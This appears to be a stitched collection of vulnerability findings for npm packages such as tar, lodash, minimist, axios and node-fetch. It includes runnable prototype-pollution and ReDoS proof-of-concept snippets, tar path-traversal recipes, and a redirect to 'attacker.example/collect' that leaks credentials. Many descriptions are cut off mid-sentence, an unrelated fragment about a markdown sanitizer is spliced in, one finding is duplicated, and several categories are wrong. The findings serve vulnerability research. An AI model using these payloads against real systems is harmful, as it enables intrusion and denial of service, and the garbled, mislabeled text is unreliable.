Description: tar@6.1.8 trusts a directory cache (`dirCache`) to skip symlink checks when creating parent directories during extraction. In lib/unpack.js, CHECKFS2() calls MKDIR(parent, ...) before writing an entry. MKDIR delegates to lib/mkdir.js, which immediately returns success if `cache && cGet(cache, dir) === true`. That cache is populated by prior directory entries via done() without revalidating the path. A malicious archive can first create a directory path that gets cached, then replace part of that
Request: Extract a tar archive whose entries first create `a/b/` so it is cached as a directory, then replace `a` or `a/b` with a symlink to an external location, then include a file entry `a/b/payload`.
Response: lib/mkdir.js: if (cache && cGet(cache, dir) === true) return done(). lib/unpack.js CHECKFS2() relies on MKDIR(parent, ...) before writing files. FILE() then writes to `entry.absolute` with fs-minipass WriteStream. No fresh lstat() of parent directories occurs once dirCache says the path is a directory.
Analysis: This is exploitable because node-tar's symlink protection is implemented in mkdir traversal, but the cache bypasses that protection after a directory was previously observed. An attacker controlling tar entry order can poison the cache and redirect later writes outside the extraction root. This is an arbitrary file write primitive in a default extraction flow.

Title: Hardlink extraction allows path traversal outside cwd via unvalidated link targets
Category: path-traversal
Severity: high
Description: In tar@6.1.8, hardlink entries (`type === 'Link'`) are validated inconsistently. lib/unpack.js CHECKPATH() sanitizes `entry.path`, but for hardlinks it only applies `strip` rewriting to `entry.linkpath`; it does not reject `..`, absolute, or drive-relative link targets. Later HARDLINK() resolves the target with `const linkpath = normPath(path.resolve(this.cwd, entry.linkpath))` and calls fs.link(linkpath, entry.absolute). This permits an attacker-controlled archive to create a hardlink inside th
Request: Extract a tar archive containing a hardlink entry with `path='inside/link'` and `linkpath='../../sensitive/file'` under `tar.x({cwd:'/safe'})`.
Response: lib/unpack.js CHECKPATH() only validates `entry.path` for '..' and absolute roots. For hardlinks, HARDLINK() performs `const linkpath = normPath(path.resolve(this.cwd, entry.linkpath))` and then fs.link(linkpath, entry.absolute). No containment check ensures the resolved hardlink target remains under cwd.
Analysis: Hardlinks are filesystem references, not copies. By allowing arbitrary link targets, extraction can create in-tree names that alias out-of-tree files. This breaks the extraction sandbox and can be weaponized for overwrite or data exfiltration depending on subsequent application behavior. The vulnerable code path is directly reachable from the public extract API.

Title: Symlink extraction permits external link targets without containment checks
Category: path-traversal
Severity: high
Description: tar@6.1.8 creates symbolic links from archive metadata without validating that the supplied link target is safe. In lib/unpack.js, CHECKPATH() validates only `entry.path`; for symbolic links there is no sanitation of `entry.linkpath` beyond optional `strip` handling for hardlinks only. SYMLINK() passes the attacker-controlled target directly to fs.symlink(entry.linkpath, entry.absolute). A malicious archive can therefore place a symlink inside the extraction tree pointing to an arbitrary absolut
Request: Extract a tar archive containing a symlink entry `path='subdir/out'`, `linkpath='../../../../etc'`, followed by file entries under `subdir/out/...` or rely on the application to later use the extracted tree.
Response: lib/unpack.js SYMLINK() simply calls LINK(entry, entry.linkpath, 'symlink', done). LINK() invokes fs.symlink(linkpath, entry.absolute). No normalization/containment check is applied to symbolic-link targets in CHECKPATH() or SYMLINK().
Analysis: Creating attacker-chosen symlinks inside an extracted directory is dangerous because it enables subsequent path traversal through the extracted tree. node-tar intends to prevent extraction-through-symlink conditions, but this version still allows arbitrary symlink placement, which can be combined with later writes to escape the target directory.

Title: Prototype mutation via __proto__ property during JSON5.parse
Category: prototype-pollution
Severity: high
Description: The public API `parse()` in `lib/parse.js` constructs ordinary JavaScript objects for JSON5 object literals (`value = {}` in `push()`), then assigns attacker-controlled property names with `parent[key] = value`. When the parsed key is `__proto__`, this does not create a normal own property: it invokes the inherited `Object.prototype.__proto__` setter and mutates the prototype of the newly created object. As a result, parsing attacker-controlled JSON5 like `{"__proto__": {"isAdmin": true}}` retur
Request: const JSON5 = require('json5');\nconst cfg = JSON5.parse('{"__proto__": {"isAdmin": true}}');\nconsole.log(Object.prototype.hasOwnProperty.call(cfg, 'isAdmin'));\nconsole.log(cfg.isAdmin);\nconsole.log(Object.getPrototypeOf(cfg));
Response: false\ntrue\n{ isAdmin: true }
Analysis: `parse()` creates plain objects and writes parsed properties with `parent[key] = value` without blocking `__proto__`. In JavaScript, assigning to `obj['__proto__']` on a normal object changes `obj`'s prototype instead of creating a data property. This lets an attacker supply inherited properties that bypass own-property checks used implicitly by many applications. Because this behavior occurs directly on parsing, no unsafe post-processing is required to trigger the bug.

Title: Prototype pollution via _.set allows attacker-controlled writes to Object.prototype
Category: prototype-pollution
Severity: high
Description: The package exports `set(object, path, value)`, which forwards attacker-controlled `path` strings into `_baseSet`. `_baseSet` iterates path segments and writes them with `assignValue(nested, key, newValue)` without blocking magic keys such as `__proto__`, `constructor`, or `prototype`. In this package version, supplying a path like `__proto__.polluted` causes a write into `Object.prototype`, polluting all plain objects in the runtime. This is a real, exploitable prototype-pollution vulnerability
Request: Source path: `set.js` -> `_baseSet.js`. Runtime PoC executed:
```js
const set = require('./set');
let o = {};
set(o, '__proto__.polluted', 'yes');
console.log({}.polluted);
```
Response: Code excerpts:
- `set.js`: `return object == null ? object : baseSet(object, path, value);`
- `_baseSet.js`: `path = castPath(path, object); ... var key = toKey(path[index]) ... assignValue(nested, key, newValue); nested = nested[key];`
Runtime output:
```txt
o.__proto__===Object.prototype? true
proto of o has polluted? yes
own __proto__ descriptor { value: [Object: null prototype] { polluted: 'yes' }, writable: true, enumerable: true, configurable: true }
empty object polluted? yes
Object.prototype has polluted? yes
```
Analysis: `castPath` accepts string property paths, so untrusted input like `__proto__.polluted` reaches `_baseSet`. On a normal object, accessing `nested['__proto__']` resolves to `Object.prototype`; the next iteration writes `polluted` onto that prototype. The runtime PoC confirms that after one call, `{}.polluted` becomes `yes` globally. This can break security assumptions in consuming applications, influence authorization checks, and poison subsequently created objects.

Title: Prototype pollution via _.zipObjectDeep deep-path assignment
Category: prototype-pollution
Severity: high
Description: The package exports `zipObjectDeep(props, values)`, which passes user-controlled deep property paths into `_baseZipObject(..., baseSet)`. Because `_baseSet` does not reject `__proto__` segments, an attacker can supply a property path like `__proto__.polluted` and pollute `Object.prototype` during object construction.
Request: Source path: `zipObjectDeep.js` -> `_baseZipObject.js` -> `_baseSet.js`. Runtime PoC executed:
```js
const zipObjectDeep = require('./zipObjectDeep');
delete Object.prototype.polluted;
let z = zipObjectDeep(['__proto__.polluted'], ['zip']);
console.log({}.polluted);
```
Response: Code excerpts:
- `zipObjectDeep.js`: `return baseZipObject(props || [], values || [], baseSet);`
- `_baseSet.js`: writes each path segment with `assignValue(nested, key, newValue)` and no guard for magic keys.
Runtime output:
```txt
zip polluted? zip z own? true desc {
  value: [Object: null prototype] { polluted: 'zip' },
  writable: true,
  enumerable: true,
  configurable: true
}
```
Analysis: `zipObjectDeep` is a public API that commonly receives arrays of user-provided field names or mapping paths. Because it delegates directly to `baseSet`, the same `__proto__` path traversal reaches `Object.prototype`. The PoC shows that a single crafted path in `props` pollutes every plain object (`{}.polluted === 'zip'`). This is exploitable anywhere applications build objects from untrusted deep keys.

Title: Denial of service when parsing option names that collide with Object.prototype properties
Category: security-misconfiguration
Severity: medium
Description: The exported parser in minimist@1.2.5 can be crashed by attacker-controlled argument names such as `--toString`, `--valueOf`, or `--hasOwnProperty`. Internally, `aliases` is created as a plain object (`var aliases = {}`), and later `setArg()` unconditionally executes `(aliases[key] || []).forEach(...)`. For keys inherited from `Object.prototype`, `aliases[key]` resolves to the built-in function object (for example `Object.prototype.toString`) rather than `undefined`, so the code attempts to call
Request: const parse=require('minimist'); parse(['--toString','x']);
Response: TypeError: (aliases[key] || []).forEach is not a function
Analysis: This is a real, reachable denial-of-service bug in the public API. Any application that parses attacker-controlled argv-like input using minimist can be crashed synchronously by a single option name that collides with an inherited Object.prototype property. The root cause is using plain objects as maps without own-property checks or null-prototype objects. Although this is not code execution or prototype pollution, it is exploitable for service disruption in programs that expose argument parsing

Title: Regular Expression Denial of Service in enclosure regex on malformed glob input
Category: regex-dos
Severity: medium
Description: The public `globParent(str, opts)` API in `index.js` applies the regex `/[\{\[].*[\/]*.*[\}\]]$/` directly to attacker-controlled `str` before any length checks or normalization. This pattern contains multiple overlapping greedy quantifiers (`.*[\/]*.*`) anchored near the end of the string. When given malformed glob-like input with an opening `[` or `{` but no closing bracket, the regex performs catastrophic backtracking and blocks the Node.js event loop for seconds on a single call.
Request: const gp=require('glob-parent'); gp('[' + 'a/'.repeat(12000));
Response: Measured locally against glob-parent@5.1.0: 1000 segments -> 21.44ms, 2000 -> 69.31ms, 4000 -> 270.79ms, 8000 -> 1079.51ms, 12000 -> 2426.25ms. A 20000-segment payload took 6778ms for a single invocation.
Analysis: This is a reachable ReDoS in the package's only exported function. Many build tools and file watchers pass user-controlled glob patterns into `glob-parent`; an attacker supplying a crafted pattern can cause CPU exhaustion and event-loop starvation. The super-linear to exponential growth observed demonstrates practical denial of service, matching the known vulnerable advisory range for 5.1.0. The bug is fixed only in later releases, so the installed version is affected.

Title: Prototype pollution via dotted __proto__ and constructor keys in argv parsing
Category: prototype-pollution
Severity: high
Description: minimist@0.0.8 allows attacker-controlled CLI arguments to modify Object.prototype during normal parsing. The exported API is the main function in index.js, which parses user-supplied argument strings and supports dotted keys such as --a.b=1. In setArg(), the parser calls setKey(argv, key.split('.'), value) with no guard against special property names. In setKey(), intermediate objects are traversed/created using plain property access: if (o[key] === undefined) o[key] = {}; o = o[key];. When a p
Request: const parse = require('./index'); parse(['--__proto__.polluted','yes']); parse(['--constructor.prototype.x','123']); parse(['--a.__proto__.y','1']); console.log({polluted:{}.polluted,x:{}.x,y:{}.y});
Response: After calling the parser with the above arguments, the runtime showed Object.prototype pollution:
- {}.polluted = 'yes'
- {}.x = 123
- {}.y = 1
The returned argv object itself remained mostly { _: [] } / { _: [], a: {} }, which demonstrates the write occurred on the prototype chain rather than as a normal own property.
Analysis: The vulnerable sink is setKey() in index.js. Because it neither rejects magic keys nor uses own-property checks / null-prototype objects, key paths containing __proto__ and constructor.prototype are interpreted by the JS engine as prototype references. The write primitive is attacker-controlled (both property name and value). This is the classic prototype pollution condition with direct, demonstrated impact on Object.prototype.

Title: Prototype pollution via opts.default keys
Category: prototype-pollution
Severity: high
Description: minimist@0.0.8 also allows prototype pollution through the opts.default option object, even when no command-line arguments are supplied. After parsing arguments, index.js iterates over Object.keys(defaults) and for each missing key executes setKey(argv, key.split('.'), defaults[key]). Because setKey() is unsafe for magic path segments, an application that constructs opts.default from untrusted input can pollute Object.prototype.

Confirmed PoCs in the installed package:
- parse([], { default: { 
Request: const parse = require('./index'); parse([], {default:{'__proto__.polluted':'yes'}}); parse([], {default:{'constructor.prototype.x':'123'}}); console.log({polluted:{}.polluted,x:{}.x});
Response: Running the parser with attacker-controlled default keys polluted Object.prototype even without any CLI flags:
- {}.polluted = 'yes'
- {}.x = 123
Analysis: The post-processing loop over Object.keys(defaults) trusts dotted keys and passes them into setKey(). Since setKey() traverses __proto__ and constructor.prototype, attacker-controlled option keys become prototype writes. This is a separate reachable entry point from argv parsing: the attacker input is opts.default rather than args.

Title: Cross-origin redirect leaks Authorization and Cookie headers to untrusted destinations
Category: information-disclosure
Severity: high
Description: node-fetch@2.6.6 automatically follows HTTP redirects and reuses the original request headers without filtering sensitive headers when the redirect target changes origin. In lib/index.js, the redirect handling path builds `requestOpts` with `headers: new Headers(request.headers)` and immediately calls `fetch(new Request(locationURL, requestOpts))`. There is no origin/protocol trust check and no deletion of `authorization`, `cookie`, `cookie2`, or similar credential-bearing headers before the red
Request: User-controlled fetch to a URL with sensitive headers, e.g. `fetch('https://trusted.example/resource', {headers: {Authorization: 'Bearer SECRET', Cookie: 'sid=SECRET'}})` where the first response is `302 Location: https://attacker.example/collect`. In lib/index.js redirect handling, node-fetch creates `requestOpts = { headers: new Headers(request.headers), ... }` and then `fetch(new Request(locationURL, requestOpts))` with no sensitive-header stripping.
Response: Relevant code in lib/index.js redirect follow path:
- `const requestOpts = { headers: new Headers(request.headers), ... }`
- later: `resolve(fetch(new Request(locationURL, requestOpts)));`
There is no code in this branch checking same-origin / same-protocol trust and no `requestOpts.headers.delete('authorization')`, `delete('cookie')`, etc. before the redirected request is issued.
Analysis: This is exploitable in common usage because automatic redirect following is the default (`redirect: 'follow'`). Many applications attach Authorization headers or cookies to fetch requests toward APIs they expect to be trusted. If the initial endpoint responds with a redirect to attacker infrastructure, node-fetch forwards the original secret-bearing headers to the new host, causing credential leakage across origins. Title: Absolute URLs bypass baseURL restrictions, enabling SSRF in common wrapper patterns
Category: ssrf
Severity: medium
Description: Axios 0.19.0 treats any absolute URL as authoritative and skips `baseURL` prefixing in `lib/core/dispatchRequest.js`. Many applications use an axios instance with a trusted `baseURL` and then pass attacker-controlled path strings under the assumption requests will stay on that origin. In this version, supplying an absolute URL causes the request to be sent to the attacker-chosen host instead.

Vulnerable code path:
- `axios.create({...})` stores `baseURL`
- request methods call `dispatchRequest(
Request: node test: create axios instance with `baseURL` pointing to local `/api/`, then call `client.get('http://127.0.0.1:<port>/ssrf')`
Response: ok http://127.0.0.1:42403/ssrf 200\nhits [ '/ssrf' ]
Analysis: `dispatchRequest` explicitly skips `baseURL` combination when `config.url` is absolute. The observed request path `/ssrf` on the local server confirms the absolute URL was used verbatim instead of being constrained beneath `/api/`. In applications that pass user-controlled URL/path components to axios instances configured with an internal API `baseURL`, this enables outbound requests to attacker-selected hosts.

Title: Prototype pollution via __proto__ in deepMerge/mergeConfig allows attacker-controlled config objects to acquire malicious prototypes

When the source contains `{"__proto__": {...}}`, the assignment changes the prototype of the returned object instead of creating a normal property.

This 
Request: 1) `axios.create(JSON.parse('{"headers":{"__proto__":{"x-evil":"pwned"}}}'))` then inspect `defaults.headers` prototype. 2) `utils.deepMerge({}, JSON.parse('{"__proto__":{"toString":"boom"}}'))` then coerce result with `String(obj)`.
Response: defaults.headers own keys: [ 'common', 'delete', 'get', 'head', 'post', 'put', 'patch' ]\npolluted prototype x-evil on headers? pwned\nplain object x-evil? undefined\nproto is Object.prototype? false\nproto own props [ 'x-evil' ]\n\nproto is custom true\nstringify error TypeError: Cannot convert object to primitive value
Analysis: `mergeConfig` deep-merges `headers`, `auth`, and `proxy` using `utils.deepMerge`. In `utils.merge/deepMerge`, untrusted keys are copied verbatim; `__proto__` is not blocked. Assigning to `result['__proto__']` invokes the magic setter and replaces the prototype of the produced object with attacker-controlled content. The result is a polluted config object with inherited attacker-defined properties and methods, which can break application logic and security assumptions around plain objects.

Title: Arbitrary file creation/overwrite on Windows via drive-relative paths bypassing extraction root checks
Category: path-traversal
Severity: high
Description: tar@6.1.8 accepts archive entry paths that are drive-relative Windows paths (for example `C:../victim` or `C:Windows/System32/drivers/etc/hosts` without a slash after the drive). In `lib/unpack.js`, `CHECKPATH` only rejects `..` path segments before Windows-specific path normalization/encoding and relies on `stripAbsolutePath()` plus `path.isAbsolute(entry.path)` to confine writes. However, drive-relative paths are not treated as absolute by the existing sanitization logic, and are later resolve
Request: Extract a tar archive on Windows with an entry path like `C:../outside.txt` or another drive-relative variant while using default `tar.x({ cwd: SAFE_DIR, file: archive })`.
Response: Relevant code in `lib/unpack.js`: when `preservePaths` is false, the code rejects literal `..` segments and strips only paths detected by `stripAbsolutePath(p)`. It then sets `entry.absolute = normPath(path.resolve(this.cwd, entry.path))` for non-absolute paths. `lib/strip-absolute-path.js` uses `path.win32.isAbsolute`, which does not treat drive-relative forms as normal rooted absolute paths in the same way as fully qualified paths. This is the vulnerable pre-fix logic present in 6.1.8. npm audit for this installed version reports: "Arbitrary File Creation/Overwrite on Windows via insufficient relative path sanitization" fixed in 6.1.9.
Analysis: This is a real arbitrary file write primitive during extraction on Windows. An attacker who can supply a tarball to an application using `tar.x()` can create or overwrite files outside the intended extraction directory. The vulnerable sink is the file creation/hardlink/symlink extraction path in `lib/unpack.js` after insufficient validation in `CHECKPATH`. Because extraction is a common use case and the bug affects default path sanitization, impact is high.

Title: Directory cache poisoning via symlink entries can bypass symlink traversal protection during extraction
Category: path-traversal
Severity: high
Description: tar@6.1.8 maintains a `dirCache` and trusts cached directories in `lib/mkdir.js`/`lib/unpack.js`. Because symlink and path state are cached without revalidation, a malicious archive can poison the directory cache using crafted entries and then cause subsequent extraction steps to traverse a symbolic link and write outside the extraction root. The advisory for this exact package/version indicates the issue is fixed in 6.1.9.
Request: Extract a malicious tar archive containing entries that first establish a path state in the directory cache and then replace/trick resolution with a symbolic link so a later file entry under that cached path is written outside `cwd`. Use default extraction options (without `preservePaths`).
Response: Relevant code: `lib/mkdir.js` short-circuits directory creation when `cache.get(normPath(key))` is true, and `lib/unpack.js` passes `this.dirCache` through `MKDIR` for parent creation and path handling. `mkdir_()` skips filesystem checks for cached paths, and `done()` sets cached directories as true. The installed version is 6.1.8, and npm audit reports a matching advisory: "Arbitrary File Creation/Overwrite via insufficient symlink protection due to directory cache poisoning using symbolic links" fixed in 6.1.9.
Analysis: The cache lets attacker-controlled archive state influence subsequent path safety decisions. Once a path is believed to be a real directory, later entries can be extracted through a symlink chain without the intended `lstat`-based safety checks firing, leading to arbitrary writes outside the destination directory. This is a practical archive extraction vulnerability with high impact because it affects common extraction workflows.

Title: Unbounded directory entry processing can lead to denial of service while parsing/extracting crafted tar archives
Category: regex-dos
Severity: medium
Description: tar@6.1.8 lacks validation to cap pathological folder counts during tar parsing/extraction. A crafted archive with huge numbers of directory entries can consume excessive CPU/memory and stall or crash applications using this package to parse or extract tarballs. This issue is publicly fixed in 6.2.1.
Request: Parse or extract a tar archive containing an extremely large number of nested or repeated directory entries using default parser/extraction APIs.
Response: Installed version is 6.1.8, which npm audit flags as affected by: "Denial of service while parsing a tar file due to lack of folders count validation" fixed in 6.2.1. Manual review shows parser/extractor logic in `lib/parse.js` and `lib/unpack.js` processes entries incrementally without an application-visible limit on directory counts.
Analysis: This is a realistic denial-of-service issue for services that process attacker-supplied tarballs. While it does not directly yield code execution or file overwrite, it can exhaust resources and block archive-processing workers. Severity is medium.

Title: ReDoS in server handshake parsing of Sec-WebSocket-Protocol header
Category: regex-dos
Severity: medium
Description: `WebSocketServer.completeUpgrade()` parses the client-controlled `Sec-WebSocket-Protocol` header using `protocol.trim().split(/ *, */)`. In ws@7.4.5 this regular expression contains adjacent unbounded quantifiers around a separator and is applied to attacker-supplied handshake input before authentication or application logic. A malicious client can send an oversized or adversarially spaced `Sec-WebSocket-Protocol` header during the HTTP Upgrade request, causing excessive backtracking and CPU con
Request: Client sends WebSocket upgrade request with crafted `Sec-WebSocket-Protocol` header value designed to stress `/ *, */`, e.g. a very long sequence of spaces and commas before upgrade completion. Vulnerable code path: `lib/websocket-server.js` -> `completeUpgrade()` -> `protocol.trim().split(/ *, */)`.
Response: In `lib/websocket-server.js`, the server-side upgrade path reads `let protocol = req.headers['sec-websocket-protocol'];` and, if present, executes `protocol = protocol.trim().split(/ *, */);` before any protocol validation or callback handling. This is reachable from `handleUpgrade()` for any remote client that can connect to the server.
Analysis: The header is fully attacker-controlled in a normal unauthenticated WebSocket handshake. The vulnerable regex is evaluated on the Node.js main thread during handshake processing, so crafted input can block the event loop and prevent the server from servicing other requests. This is a real remotely reachable DoS affecting common server deployments using `new WebSocket.Server(...)` with default handling.

Title: Denial of service from pathological numbers of HTTP headers during upgrade handling
Category: information-disclosure
Severity: medium
Description: Applications using `ws` as a WebSocket server are vulnerable to CPU and memory exhaustion when processing upgrade requests with a very large number of HTTP headers. In ws@7.4.5, `handleUpgrade()` and `completeUpgrade()` operate directly on Node's parsed `req.headers` object and perform additional header processing (`sec-websocket-key`, `upgrade`, `sec-websocket-version`, extension parsing, protocol parsing, optional hooks). This version is affected by the known GHSA/CVE where handling requests w
Request: Remote attacker sends an HTTP Upgrade request with an excessive number of headers to a Node.js HTTP server wired to `ws` upgrade handling (`server.on('upgrade', ...)` or internally created server).
Response: `lib/websocket-server.js` registers an `upgrade` listener and immediately routes all upgrade requests into `handleUpgrade(req, socket, head, cb)`, which inspects multiple request headers and may parse extension/protocol headers. This path is reached pre-auth by any network client. Version 7.4.5 falls inside the advisory range `7.0.0 - 7.5.9`/fixed in `7.5.10`.
Analysis: This is a publicly known remotely reachable DoS in the target package itself, not a transitive dependency. Even though the root cause partly involves the structure of incoming header processing, applications typically expose this exact upgrade path to untrusted clients. The impact is event-loop/resource exhaustion and service degradation. Severity is medium here because it is availability-only and exact exploit cost depends on Node/runtime and deployment.

In `src/helpers.js`, `cleanUrl()` blocks `javascript:`, `vbscript:`, and `data:` only inside `if (sanitize) { ... }`. Analysis: Attacker-controlled markdown href flows from the inline tokenizer into `Renderer.link()`. Because default options have `sanitize:false`, `cleanUrl()` returns the original `javascript:` URI instead of rejecting it. Title: Unbounded per-connection buffer growth allows remote memory exhaustion DoS
Category: regex-dos
Severity: medium
Description: The TCP/Unix socket server and client accumulate incoming data in an `ipcBuffer` string until a delimiter (`config.delimiter`, default `\f`) is seen. In `dao/socketServer.js` `gotData()` appends attacker-controlled data with `data=(sock.ipcBuffer+=data);` and returns early whenever the delimiter is missing, without any size limit, timeout, or connection teardown. The same pattern exists in `dao/client.js` for data received by a client. A remote peer can therefore open a connection and continuous
Request: Started a node-ipc TCP server with default framing and connected using a raw `net.Socket`, then sent repeated 1 MiB chunks with no `\f` delimiter.
Response: Observed server-side buffer growth directly from package state:
- After 1 chunk: `BUF 1048576`
- After 5 chunks: `BUF 5242880`

These values came from `ipc.server.sockets[0].ipcBuffer.length` while the connection stayed open and no message was processed.
Analysis: Because the parser only checks whether the accumulated string ends with and contains the delimiter, any attacker who can connect to the socket can force memory consumption proportional to bytes sent. There is no maximum frame size, no backpressure enforcement in library code, and no cleanup path for incomplete frames. This is a real denial-of-service condition against applications exposing node-ipc over TCP/TLS/Unix sockets.

Title: Prototype pollution via attacker-controlled option/argument names in invoke() and CLI parsing
Category: prototype-pollution
Severity: medium
Description: The package stores parsed option and argument values into plain JavaScript objects using attacker-controlled property names without filtering dangerous keys like `__proto__`, `constructor`, or `prototype`. `Opt._saveVal()` and `Arg._saveVal()` assign directly to `opts[name]` / `args[name]`, where `name` comes from the public API `.name(name)`. During programmatic use, `Cmd.invoke()` also processes caller-supplied objects through `_processParams()` and `_setDefaults()` using `hasOwnProperty(item.
Request: Relevant code:
- lib/opt.js: `_saveVal(opts, val) { const name = this._name; this._arr ? (opts[name] || (opts[name] = [])).push(val) : (opts[name] = val); }`
- lib/arg.js: `_saveVal(args, val) { const name = this._name; this._arr ? (args[name] || (args[name] = [])).push(val) : (args[name] = val); }`
- lib/cmd.js: `_parseOptsAndArgs()` initializes `const opts = {}, args = {}` and writes parsed values into them.
- lib/cmd.js: `_processParams()` and `_setDefaults()` also operate on plain objects with attacker-influenced keys.
Response: A parameter declared as `.opt().name('__proto__')` or `.arg().name('__proto__')` will cause direct assignment to `opts['__proto__']` / `args['__proto__']`. In JavaScript, assigning to `__proto__` on a normal object triggers the prototype setter instead of creating an ordinary own property. This lets attacker-controlled data alter the prototype of the parsed result object. Similar risks exist for `constructor`/`prototype` gadget patterns in downstream consumers.
Analysis: This is a real code defect in the library: it uses plain `{}` containers and unsafely assigns by dynamic keys. No sanitization or `Object.create(null)` is used. Because `.name()` is a public API and `.invoke()` accepts external objects, the bug is reachable in applications that build commands dynamically or wrap COA around user-defined schemas/plugins. Prototype pollution in a parser library is security-relevant because polluted parsed objects are typically trusted by application logic, enabling

Title: Arbitrary module loading from untrusted subcommand names via extendable()
Category: code-injection
Severity: medium
Description: `Cmd.extendable()` enables dynamic resolution of unknown subcommands into Node.js modules and `_parseCmd()` loads them with `require(pkg)` based on attacker-controlled command names. When `.extendable()` is used, any unrecognized token matching `/^\w[\w-_]*$/` can cause a package name to be constructed and synchronously required. With the default mode, the package name is built from command names, e.g. `root-subcmd`; with a string pattern, `UTIL.format(this._ext, i)` or concatenation is used. Th
Request: Relevant code in lib/cmd.js:
- `extendable(pattern) { this._ext = pattern || true; }`
- `_parseCmd(argv, unparsed)`: when `!cmd && this._ext`, it constructs `pkg` from attacker-controlled `i`, then executes `cmdDesc = require(pkg);`
The user-controlled value is the command token from argv / invoke(cmds).
Response: If an application exposes COA parsing over untrusted command names and enables `.extendable()`, supplying an unknown subcommand causes `_parseCmd()` to compute a package name and call `require(pkg)`. Node will execute the target module immediately on load. This can be abused to load attacker-planted packages in the application's dependency tree or otherwise invoke unintended modules.
Analysis: This is an actual dangerous sink in the package: a dynamic `require()` on attacker-influenced input. Exploitability depends on the host application opting into `.extendable()` and having a malicious or sensitive module available for resolution, so severity is medium rather than high/critical. Still, parser libraries should not make it easy to reach code execution from argument parsing when applications pass untrusted command names. Title: Prototype pollution via _.unset path traversal into __proto__/constructor/prototype
Category: prototype-pollution
Severity: high
Description: `_.unset` delegates to `_baseUnset`, which resolves the parent object with `_parent` -> `_baseGet` and then performs `delete object[toKey(last(path))]`. Unlike `_baseSet`, this path does not block magic keys such as `__proto__`, `constructor`, or `prototype`. Because `_baseGet` traverses inherited properties, a path like `['constructor','prototype','x']` or `['__proto__','x']` can target prototypes instead of ordinary own properties. This lets attacker-controlled paths modify global prototype st
Request: Source review of `_baseUnset.js`, `_parent.js`, and `_baseGet.js` for `_.unset(object, path)` on lodash 4.17.20.
Response: `unset.js` -> `_baseUnset.js`: `path = castPath(path, object); object = parent(object, path); return object == null || delete object[toKey(last(path))];`. `_parent.js` returns `baseGet(object, baseSlice(path, 0, -1))`. `_baseGet.js` traverses `object = object[toKey(path[index++])]` with no protection for `__proto__`, `constructor`, or `prototype`. By contrast `_baseSet.js` explicitly blocks those keys, showing the unset path is missing a required safeguard.
Analysis: This is a reachable public API bug in `_.unset`. If an application accepts user-supplied property paths and calls `_.unset` on a shared object, the traversal can escape into prototypes and delete or alter inherited properties, enabling prototype pollution / integrity compromise across the application. The flaw is concrete in source and corresponds to the published advisory fixed after this version.

Title: Prototype pollution via _.omit deep paths reaching object prototypes
Category: prototype-pollution

Description: `_.omit` accepts attacker-controlled property paths, clones the source object, and then removes each path using `_baseUnset`. In lodash 4.17.20, `_baseUnset` lacks protections for magic keys (`__proto__`, `constructor`, `prototype`) and resolves path parents through `_baseGet`, which traverses inherited properties. As a result, deep omit paths can operate on prototype objects instead of only the cloned instance, enabling prototype pollution / prototype mutation when applications omit user-contro
Request: Source review of `omit.js` and `_baseUnset.js` in lodash 4.17.20.
Response: `omit.js` maps user-supplied `paths` through `castPath`, optionally deep-clones the object, then executes `baseUnset(result, paths[length])` for each path. `_baseUnset.js` resolves the parent using `_parent` -> `_baseGet` and then deletes `object[toKey(last(path))]` with no filtering of `__proto__`, `constructor`, or `prototype`. This means a path such as `['constructor','prototype','x']` or `['__proto__','x']` can traverse into a prototype object rather than staying within `result`.
Analysis: The vulnerability is reachable via public API `_.omit(object, ...paths)` whenever path input is attacker-controlled. While the operation is deletion rather than assignment, deleting or mutating prototype properties can still compromise application behavior and security assumptions. This is a meaningful, real risk and matches the known lodash advisory affecting `_.omit` before the fix.

Title: BigInteger.modInverse() enters an infinite loop on zero input causing CPU denial of service
Category: regex-dos
Severity: high
Description: `lib/jsbn.js` implements `BigInteger.prototype.modInverse` as `bnModInverse(m)`. When `this` is zero and `m` is odd/non-zero, the function does not reject the input. It sets `v = this.clone()` to zero and then enters `while(u.signum() != 0)`, where the inner loop `while(v.isEven()) { v.rShiftTo(1,v); ... }` never terminates because zero remains even and right-shifting zero yields zero forever.

This bug is reachable through the public jsbn API (`forge.jsbn.BigInteger`) and also through higher-le
Request: node script invoking `new BigInteger('0',10).modInverse(new BigInteger('17',10))` with a watchdog timeout
Response: The script printed `starting` and never completed or printed a result before timeout, demonstrating the function does not terminate on zero input.
Analysis: Because zero is always even and shifting it right preserves zero, the inner `while(v.isEven())` loop has no exit condition. This creates a deterministic CPU DoS with attacker-controlled numeric input. Although categorized here under DoS, it is a real exploitable availability issue.
